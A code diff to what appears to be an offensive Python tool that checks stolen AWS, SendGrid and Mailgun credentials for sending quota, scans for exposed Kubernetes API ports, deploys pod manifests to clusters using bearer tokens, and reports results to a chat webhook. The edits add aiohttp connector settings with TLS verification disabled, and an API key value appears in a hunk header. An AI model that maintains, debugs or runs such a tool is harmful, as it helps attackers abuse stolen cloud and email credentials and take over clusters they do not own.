@@ -156,7 +156,14 @@ class AWSCredentialVerifier:
             payload = "Action=GetSendQuota&Version=2010-12-01"
             headers = self._sign_request('POST', url, headers, payload, access_key, secret_key)
             
-            async with aiohttp.ClientSession() as session:
+            # ✅ FIX: Proper connector configuration - no conflict
+            connector = aiohttp.TCPConnector(
+                ssl=False,
+                keepalive_timeout=30,
+                limit=10
+            )
+            
+            async with aiohttp.ClientSession(connector=connector) as session:
                 async with session.post(url, headers=headers, data=payload, timeout=10) as response:
                     if response.status == 200:
                         content = await response.text()
@@ -198,7 +205,14 @@ class AWSCredentialVerifier:
             payload = "Action=ListTopics&Version=2010-03-31"
             headers = self._sign_request('POST', url, headers, payload, access_key, secret_key)
             
-            async with aiohttp.ClientSession() as session:
+            # ✅ FIX: Proper connector configuration
+            connector = aiohttp.TCPConnector(
+                ssl=False,
+                keepalive_timeout=30,
+                limit=10
+            )
+            
+            async with aiohttp.ClientSession(connector=connector) as session:
                 async with session.post(url, headers=headers, data=payload, timeout=10) as response:
                     if response.status == 200:
                         content = await response.text()
@@ -232,7 +246,14 @@ class SendGridVerifier:
                 'Content-Type': 'application/json'
             }
             
-            async with aiohttp.ClientSession() as session:
+            # ✅ FIX: Proper connector configuration
+            connector = aiohttp.TCPConnector(
+                ssl=False,
+                keepalive_timeout=30,
+                limit=10
+            )
+            
+            async with aiohttp.ClientSession(connector=connector) as session:
                 # Check user credits
                 async with session.get('https://api.sendgrid.com/v3/user/credits', 
                                      headers=headers, timeout=10) as response:
@@ -274,9 +295,17 @@ class KubernetesExploiter:
         clusters = []
         ports = [6443, 8443, 8080, 10250]
         
+        # ✅ FIX: This was the main issue - proper connector configuration
+        connector = aiohttp.TCPConnector(
+            ssl=False,
+            keepalive_timeout=30,  # ✅ Keep connections alive for better performance
+            limit=100,
+            limit_per_host=20
+        )
+        
         async with aiohttp.ClientSession(
             timeout=aiohttp.ClientTimeout(total=5),
-            connector=aiohttp.TCPConnector(ssl=False)
+            connector=connector
         ) as session:
             
             tasks = []
@@ -362,7 +391,10 @@ class KubernetesExploiter:
             if cluster.token:
                 headers["Authorization"] = f"Bearer {cluster.token}"
             
-            async with aiohttp.ClientSession() as session:
+            # ✅ FIX: Proper connector configuration
+            connector = aiohttp.TCPConnector(ssl=False, keepalive_timeout=30)
+            
+            async with aiohttp.ClientSession(connector=connector) as session:
                 async with session.post(url, json=pod_manifest, headers=headers, 
                                       ssl=False, timeout=30) as response:
                     if response.status in [200, 201]:
@@ -420,7 +452,10 @@ class KubernetesExploiter:
             if cluster.token:
                 headers["Authorization"] = f"Bearer {cluster.token}"
             
-            async with aiohttp.ClientSession() as session:
+            # ✅ FIX: Proper connector configuration
+            connector = aiohttp.TCPConnector(ssl=False, keepalive_timeout=15)
+            
+            async with aiohttp.ClientSession(connector=connector) as session:
                 async with session.get(url, headers=headers, ssl=False, timeout=15) as response:
                     if response.status == 200:
                         data = await response.json()
@@ -661,7 +696,10 @@ MAILGUN_API_KEY=key-3ax6xnjp29jd6fds4gc373sgvjxteol0
                     "parse_mode": "Markdown"
                 }
             
-            async with aiohttp.ClientSession() as session:
+            # ✅ FIX: Proper connector configuration for webhooks
+            connector = aiohttp.TCPConnector(ssl=False, keepalive_timeout=10)
+            
+            async with aiohttp.ClientSession(connector=connector) as session:
                 async with session.post(webhook_url, json=payload, timeout=10) as response:
                     if response.status == 200:
                         logger.info("✅ Notification sent successfully")
